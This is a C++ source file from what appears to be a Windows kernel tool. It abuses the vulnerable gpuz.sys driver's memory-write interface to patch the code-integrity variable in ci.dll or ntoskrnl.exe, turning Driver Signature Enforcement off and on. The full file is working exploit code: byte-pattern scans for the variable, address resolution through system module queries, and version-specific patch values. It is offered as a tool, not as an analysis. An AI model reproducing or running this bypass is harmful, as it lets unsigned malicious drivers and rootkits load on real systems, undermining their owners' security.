#include "Global.h"

#define CI_DLL "ci.dll"
#define CI_PATTERN "89 0D ? ? ? ? 49 8B F8"

#define NTOS_EXE "ntoskrnl.exe"
#define NTOS_PATTERN "C6 05 ? ? ? ? ? 8D 7B 06"

/* Initialization Routine */
sys::sys(uint32_t BuildNumber)
	: dwBuildNumber(BuildNumber)
{
	if (BuildNumber < 7601)			// Check if OSBuildNumber Is Supported
		throw std::runtime_error("OS Not Supported.");

	Driver = new gpuz();			// Initialize gpuz.sys IOCTL functions used for reading/writing System Memory

	if (Driver == nullptr)
		throw std::runtime_error("gpuz Class Object Is Not Initialized.");

	g_CiVar = QueryVar() - 0x100000000;			// Query The Global System Variable For Patching
}

/* Call to gpuz.sys to patch the global system variable */
BOOLEAN sys::DisableDSE()
{
	std::cout << "Disabling DSE...\n";
	int val = dwBuildNumber < 9200 ? 0 : 8;			// Get Correct Value To Patch Depending On The OS Version
	return Driver->WriteSystemAddress<uint32_t>(g_CiVar, val);
}

/* Call to gpuz.sys to re enable DSE */
BOOLEAN sys::EnableDSE()
{
	std::cout << "Enabling DSE...\n";
	int val = dwBuildNumber < 9200 ? 1 : 6;			// Get Correct Value To Patch Depending On The OS Version
	return Driver->WriteSystemAddress<uint32_t>(g_CiVar, val);
}

sys::~sys()
{
	Driver->~gpuz();
}

uint64_t sys::QueryVar()
{
	uint64_t SystemImageBase = 0;

	GetSystemDirectoryA(szSystemPath, MAX_PATH);
	strcat_s(szSystemPath, "\\");

	/* Initialize Dynamic Data */
	if (dwBuildNumber < 9200) // Windows 7
	{
		ImageName = NTOS_EXE;			// Global Variable Is Located In ntoskrnl.exe
		VariablePattern = NTOS_PATTERN;
		AddressOffset = 7;
	}
	else						// Rest of the supported OS
	{
		ImageName = CI_DLL;				// Global Variable Is Located In CI.dll
		VariablePattern = CI_PATTERN;
		AddressOffset = 6;
	}
	strcat_s(szSystemPath, ImageName);

	HMODULE MappedImage = LoadLibraryExA(szSystemPath, NULL, DONT_RESOLVE_DLL_REFERENCES);		// Load the system module to memory
	if (!MappedImage)
		throw std::runtime_error("Cannot Load System Image.");

	if (!GetModuleInformation(GetCurrentProcess(), MappedImage, &ModInfo, sizeof(ModInfo)))		// Get Information About It
		throw std::runtime_error("Could Not Get Module Information.");

	auto& utils = Utils::instance();
	uint64_t varAddress = utils.FindPattern((uint64_t)ModInfo.lpBaseOfDll, ModInfo.SizeOfImage, VariablePattern, 0);	// Pattern Search For The OS Specified Variable

	if (!varAddress)
		throw std::runtime_error("Could Not Find System Module Address.");

	uint32_t relative = *(uint32_t*)(varAddress + 2);			// Dereference the relative offset
	FreeModule(MappedImage);

	uint64_t g_CiVar = varAddress + relative + AddressOffset;		// GlobalVar = FoundAddress + relative + OSSpecifiedAddressOffset
	g_CiVar -= (uint64_t)ModInfo.lpBaseOfDll;						// GlobalVarAddress - MappedSystemModuleBaseAddress = GlobalVarOffsetFromModuleBase

	if (!GetSystemImageInformation(ImageName, &SystemImageBase))		// Get System Module Base Loaded By The OS
		throw std::runtime_error("Could Not Get System Image Information.");

	g_CiVar += SystemImageBase;		// Add its BaseAddress To GlobalVarOffset
	return g_CiVar;
}

/* Queries OS Loaded System Modules */
BOOLEAN sys::GetSystemImageInformation(const char* SystemModuleName, uint64_t* ImageBase)
{
	PRTL_PROCESS_MODULES pModInfo = (PRTL_PROCESS_MODULES)GetSystemInformation((SYSTEM_INFORMATION_CLASS)11);		// Query System Module Information
	int i = pModInfo->NumberOfModules - 1;
	if (pModInfo)
	{
		auto& utils = Utils::instance();

		/* Iterate System Module For Desired Module And Return Its ImageBase */
		for (; i != -1; --i)
		{
			RTL_PROCESS_MODULE_INFORMATION entry = pModInfo->Modules[i];
			char* ImageName = utils.ToLower((char*)&entry.FullPathName[entry.OffsetToFileName]);

			BOOLEAN Found = !strcmp(ImageName, SystemModuleName)
				|| !strcmp((char*)&entry.FullPathName[entry.OffsetToFileName], SystemModuleName);

			free(ImageName);
			if (Found)
			{
				*ImageBase = (uint64_t)entry.ImageBase;
				break;
			}
		}
	}
	VirtualFree(pModInfo, 0, MEM_RELEASE);
	return i != -1;
}

/* Call To Native QuerySystemInformation To Get SystemModuleInformation */
PVOID sys::GetSystemInformation(SYSTEM_INFORMATION_CLASS InfoClass)
{
	ULONG RetLen = 0;
	NTSTATUS status = NtQuerySystemInformation(InfoClass, NULL, 0, &RetLen);
	if (status != STATUS_INFO_LENGTH_MISMATCH)
	{
		std::cout << "Status: " << std::hex << status << std::endl;
		return 0;
	}

	PVOID pBuffer = VirtualAlloc(NULL, RetLen, MEM_COMMIT, PAGE_READWRITE);
	if (!pBuffer)
	{
		std::cout << "Could not allocate buffer\n";
		return 0;
	}

	status = NtQuerySystemInformation(InfoClass, pBuffer, RetLen, &RetLen);
	if (!NT_SUCCESS(status))
	{
		std::cout << "Could not query info. Status: " << std::hex << status << std::endl;
		VirtualFree(pBuffer, 0, MEM_RELEASE);
		return 0;
	}
	return pBuffer;
}